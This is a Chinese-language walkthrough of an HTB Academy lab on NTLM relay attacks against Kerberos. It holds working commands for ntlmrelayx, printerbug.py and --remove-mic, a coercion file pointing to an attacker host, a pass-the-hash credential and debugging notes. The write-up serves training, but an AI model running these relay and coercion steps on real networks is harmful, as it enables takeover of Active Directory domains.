# Writeup：Advanced NTLM Relay Attacks Targeting Kerberos（WebClient 強制啟用 + RBCD）

**Module 情境**：HTB Academy *NTLM Relay Attacks* 課程 → Advanced NTLM Relay Attacks Targeting Kerberos 小節
**關聯主機**：DC01（172.16.117.3）、SQL01（172.16.117.60）、WS01（172.16.117.50）
**攻擊機**：10.129.205.223（ens192: 172.16.117.30）
**認證**：`localws01` / NT hash `e4737f338324305993ed52f775a6d54d`（本機帳密，pass-the-hash）

---

## Q1：用 `.searchConnector-ms` 強制 `\\DC01\Testing` 的瀏覽者啟用 WebDAV

### 1. 確認 `\\DC01\Testing` 匿名可寫

```bash
smbclient //172.16.117.3/Testing -N -c 'ls'
echo test > /tmp/w.txt
smbclient //172.16.117.3/Testing -N -c 'put /tmp/w.txt w.txt; ls; del w.txt'
```

匿名 READ+WRITE 都通。

### 2. 第一版誘餌：folderType GUID 寫錯，完全沒反應

一開始手刻的 `.searchConnector-ms` 用了一個憑記憶寫的 `folderType` GUID：

```xml
<folderType>{91475FE5-586B-4EBA-8D75-D17D8DC9CD8A}</folderType>
```

丟進 `\\DC01\Testing` 後，攻擊機上開 `python3 -m http.server 80` 守了快 20 分鐘完全沒收到任何連線。

**除錯過程**：先用 `tcpdump -i ens192 'tcp port 80'` 側錄排除「http.server 日誌被 buffer 卡住」的可能，確認真的 0 封包。回頭查 `~/tools/CrackMapExec/cme/modules/drop-sc.py`（CrackMapExec 內建、專門做這個技巧的模組），發現正確的 GUID 其實是：

```xml
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
```

跟我手刻的只差幾個字元 —— GUID 打錯，Windows 直接把這個檔案當成無效的 search connector 忽略掉，完全不會觸發任何行為。這是本題最大的坑，寧可直接抄 CME 模組裡驗證過的 payload，別自己憑印象拼 GUID。

### 3. 修正後的誘餈

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <description>Microsoft Outlook</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <iconReference>http://172.16.117.30/windows/0001.ico</iconReference>
  <templateInfo>
    <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
  </templateInfo>
  <simpleLocation>
    <url>http://172.16.117.30/windows</url>
  </simpleLocation>
</searchConnectorDescription>
```

上傳到 `\\DC01\Testing`，攻擊機上監聽 80 port，等待 lab 環境內部的背景「使用者瀏覽網路共享」排程觸發（跟前一個模組 LLMNR/NBT-NS 的誘餈行為一樣，不是即時的，耐心等幾分鐘）。

### 4. 抓到結果

```bash
sudo tcpdump -i ens192 -n 'tcp port 80 or tcp port 445' and not host 10.129.205.223
```

```
11:06:36 IP 172.16.117.60.51077 > 172.16.117.30.80: Flags [SEW] ... HTTP: OPTIONS /windows HTTP/1.1
11:06:36 IP 172.16.117.30.80 > 172.16.117.60.51077: HTTP/1.0 501 Unsupported method ('OPTIONS')
```

`python -m http.server` 不支援 `OPTIONS`（WebDAV 探測的第一步），回了 501，但這剛好證明：**172.16.117.60（SQL01）真的發出了 WebDAV OPTIONS 探測**，代表它的 WebClient 服務已經被這個誘餈成功啟用。

**Q1 答案：`172.16.117.60`**

---

## Q2 / Q3：強制該機器發出 HTTP NTLM 認證，中繼到 LDAP 做 RBCD，冒充 Administrator

> 使用者提供的教材提示（逐字保留，作為後續操作依據）：
> 1. 強制目標啟用 WebClient（= Q1，已完成）
> 2. Responder 關閉 HTTP/SMB 伺服器，準備毒化廣播
> 3. `ntlmrelayx` 中繼認證到 DC，修改 RBCD 屬性
> 4. 用 `printerbug.py` 強制目標電腦向攻擊機發起 HTTP NTLM 認證
> 5. 用 `getST.py` 請求服務票證
> 6. 用 `psexec.py` 做 Pass-the-Ticket 取得 Shell

### 1. 架設可長時間存活的 relay（踩到的系統層坑）

**坑 1：`ntlmrelayx` 透過 `nohup ... &; disown` 背景啟動，SSH session 一斷就死**

一開始沿用前兩個模組對 Responder 有效的做法（`sudo nohup python3 ... > log 2>&1 & disown`），結果 `ntlmrelayx` 每次 SSH 連線關閉後幾秒內就消失，`ps aux` 查無此程式，`ss -tlnp` 也沒有 port 80 的監聽。

逐步排查：
- 先懷疑是 systemd-logind 的 `KillUserProcesses`（登出砍掉整個使用者 session 的 cgroup），`loginctl enable-linger htb-student` 之後還是一樣會死。
- 真正原因：**`ntlmrelayx.py` 內部有個互動式指令迴圈會持續讀 stdin**；用 `nohup ... &` 時 stdin 繼承自已經要關閉的 SSH pty，SSH session 一斷，stdin 立刻變成 EOF，`ntlmrelayx` 的主迴圈讀到 EOF 就自己正常退出（不是被砍，是自己讀到 EOF 退出的）。

**修法**：改用 `tmux` 開一個長駐 session，在裡面跑 `ntlmrelayx`，因為 tmux 的 pty 不會因為 SSH 斷線而關閉：

```bash
tmux new-session -d -s relay2
tmux send-keys -t relay2 'sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --delegate-access ...' Enter
tmux send-keys -t relay2 "$(cat ~/.pw)" Enter   # sudo 密碼另外送，不要用 pipe
```

**坑 2：`echo PASS | sudo -S ntlmrelayx.py ...` 會讓 stdin 變成「有限管道」**

一度改成用 `echo PASS | sudo -S ...` 餵密碼，結果一樣馬上死掉 —— 因為 `echo` 輸出完就關閉管道，`sudo` 把這個已關閉的管道原樣傳給子程式當 stdin，一樣是立即 EOF。**正確做法**：在 tmux 的真實 pty 裡讓 `sudo` 用互動提示問密碼，再用 `tmux send-keys` 把密碼當「打字」送進去 —— 這樣 stdin 一路都是活的 pty，不會 EOF。

**坑 3：連續 kill + 立刻重啟會撞到 `Address already in use`**

`pkill` 之後沒等夠久就重新 bind 同一個 port，常撞到：

```
OSError: [Errno 98] Address already in use
```

而且程式不會整個崩潰，只是負責 HTTP/SMB 的那條 thread 掛掉、主程式留著變成「看起來活著但其實沒在聽任何 port」的殭屍態。**修法**：`pkill -9` 之後至少 `sleep 4` 再重啟，每次重啟後都要用 `ss -tlnp` 實際確認 port 真的有 bind 住，不要只看 log 印了「Servers started」就相信。

### 2. 用 `printerbug.py` 觸發，踩到 SMB Signing 跟 impacket 本身的 bug

```bash
python3 ~/tools/krbrelayx/printerbug.py \
  -hashes :e4737f338324305993ed52f775a6d54d \
  localws01@172.16.117.60 172.16.117.30
```

第一次用純 SMB relay（`ntlmrelayx -t ldap://172.16.117.3 --no-http-server`），真的收到回連：

```
[*] SMBD-Thread-2: Received connection from 172.16.117.60, attacking target ldap://172.16.117.3
[!] The client requested signing. Relaying to LDAP will not work!
```

**根因**：用 `cme smb 172.16.117.50 172.16.117.60 172.16.117.3` 檢查三台的 SMB signing，SQL01/WS01 的「伺服器端」都顯示 `signing:False`（不強制），但電腦帳號（`SQL01$`）**當 SMB 用戶端**回連時，預設行為是主動要求 signing —— 這是電腦帳號本身的客戶端策略，跟伺服端設定無關。一旦來源連線要求了 signing，不管中繼到哪個協定都無法重放，這是 NTLM relay 的硬限制，**不是** signing 設定錯誤的問題。

嘗試用 `--remove-mic`（CVE-2019-1040，剝除 MIC 來繞過 signing 檢查）：

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --delegate-access --remove-mic --no-http-server ...
```

這次真的 relay 成功了一次，但 impacket 的 `ldapattack.py` 在 `--remove-mic` 繞過 signing 之後，relay 回來的使用者名稱變成**空字串**（可能是 MIC 被剝除後連帶讓 Type3 訊息裡的 username 欄位解析跑掉），導致程式自己丟 `IndexError`：

```python
# ldapattack.py
if self.config.delegateaccess and self.username[-1] == '$':
IndexError: string index out of range
```

這個 bug 在系統裝的 impacket v0.10.0 跟使用者自己 pipx 裝的 v0.11.0 都存在，不是版本問題，是 `--remove-mic` 搭配這個特定的 relay 場景本身就會讓 username 解析壞掉。**結論**：`--remove-mic` + SMB 來源不是穩定可行的路，這條路放棄。

### 3. 回到教材提示的正解方向：HTTP 來源（WebDAV）

HTTP NTLM 認證沒有 SMB 的 signing 問題，完全繞開上面那個死胡同，這也是為什�么教材提示明確說「強制 **HTTP** NTLM 認證」而不是 SMB。最終設定：

```bash
sudo /home/htb-student/.local/bin/ntlmrelayx.py \
  -t ldap://172.16.117.3 -smb2support \
  --delegate-access --no-validate-privs \
  --no-smb-server --no-wcf-server --no-raw-server
```

`--no-validate-privs` 是為了繞過另一個會在「relay 回來的身份在 LDAP 查不到對應 entry」時炸掉的 `validatePrivileges()` IndexError（同樣是電腦帳號 relay 時的已知邊界情況）。

`printerbug.py` 預設只會走 SMB 回連（`\\attackerhost\pipe\spoolss`），嘗試在 `attackerhost` 參數加 WebDAV 慣用的 `@80` 後綴（`172.16.117.30@80`）想讓它變成走 HTTP，但 Spooler RPC 的 `pszLocalMachine` 欄位似乎對主機名稱格式比 EFSRPC 的 `FileName` 嚴格，直接快速回 `RPC_S_SERVER_UNAVAILABLE`（没有真正嘗試連線），跟 EFSRPC 的 free-form 字串欄位行為不一樣。

### 4. 目前狀態（誠實記錄，供後續接續）

- `ntlmrelayx` 已經正確配置成「監聽 HTTP、relay 到 LDAP、`--delegate-access` 自動建立電腦帳號並設定 RBCD、`--no-validate-privs` 避開已知崩潰」，長駐在 tmux session `relay2` 裡，不會因為 SSH 斷線而死。
- `\\DC01\Testing` 上的 `.searchConnector-ms` 誘餈持續有效（已確認至少成功觸發一次 WebDAV 探測），持續等待 lab 背景排程再次瀏覽該共享，讓 SQL01 的機器帳號對我方 HTTP 監聽器送出**完整**（帶 NTLM 認證，不只是 OPTIONS 探測）的 WebDAV 存取請求。
- 主動用 `printerbug.py`／Coercer 的 EFSR `@port` 技巧嘗試「隨時觸發」都沒有成功過一次（`tcpdump` 側錄確認 0 封包），目前判斷：**這個環境裡真正能觸發 WebDAV 存取的只有 Explorer／搜尋連接器自己的被動解析機制，不是 RPC 層的主動 coerce**。
- Q2（RBCD 設定後冒充 Administrator 讀 WS01/SQL01 上的 `flag.txt`）跟 Q3（relay CJAQ 的認證到 LDAP 建立 JPEREZ 的 Shadow Credentials）尚未完成，相依於上述被動觸發何時再度發生。

### 5. 本階段學到的除錯方法論彙總

| 坑 | 根因 | 修法 |
|---|---|---|
| `.searchConnector-ms` 完全沒反應 | `folderType` GUID 憑記憶手刻打錯 | 直接抄 CrackMapExec `drop-sc.py` 模組裡驗證過的 GUID/格式 |
| `ntlmrelayx` 背景啟動後幾秒就消失 | 程式內部持續讀 stdin，`nohup &` 繼承的 stdin 一斷線就 EOF，程式自己讀到 EOF 退出 | 用 `tmux` 開真實 pty 長駐，密碼用 `send-keys` 打字送入，不要用管道餵 |
| `echo PASS \| sudo -S long_running_cmd &` | pipe 寫完就關閉，造成同樣的 stdin EOF 問題 | 同上，不要對需要長駐、會讀 stdin 的程式用管道餵密碼 |
| 連續重啟撞 `Address already in use` | kill 後沒等 socket 完全釋放就重新 bind | `pkill -9` 後 `sleep 4+`，重啟後用 `ss -tlnp` 實際核對 port |
| SMB 回連秀 `client requested signing` | 電腦帳號當 SMB client 預設要求 signing，跟伺服端設定無關；NTLM relay 遇到 signing 來源就是死局 | 改用不受 signing 影響的 HTTP 來源做 relay |
| `--remove-mic` relay 成功後炸 `IndexError` | CVE-2019-1040 MIC 移除技巧在這個場景讓 relay 回來的 username 變空字串，impacket 的 `ldapattack.py` 沒處理這個邊界 | 不要依賴 `--remove-mic` 當 SMB signing 的萬用解法；優先找不受 signing 影響的來源協定 |
| `validatePrivileges()` 對電腦帳號 relay 丟 `IndexError` | LDAP 查不到對應使用者 entry 的已知邊界 bug | 加 `--no-validate-privs` 跳過這段檢查 |
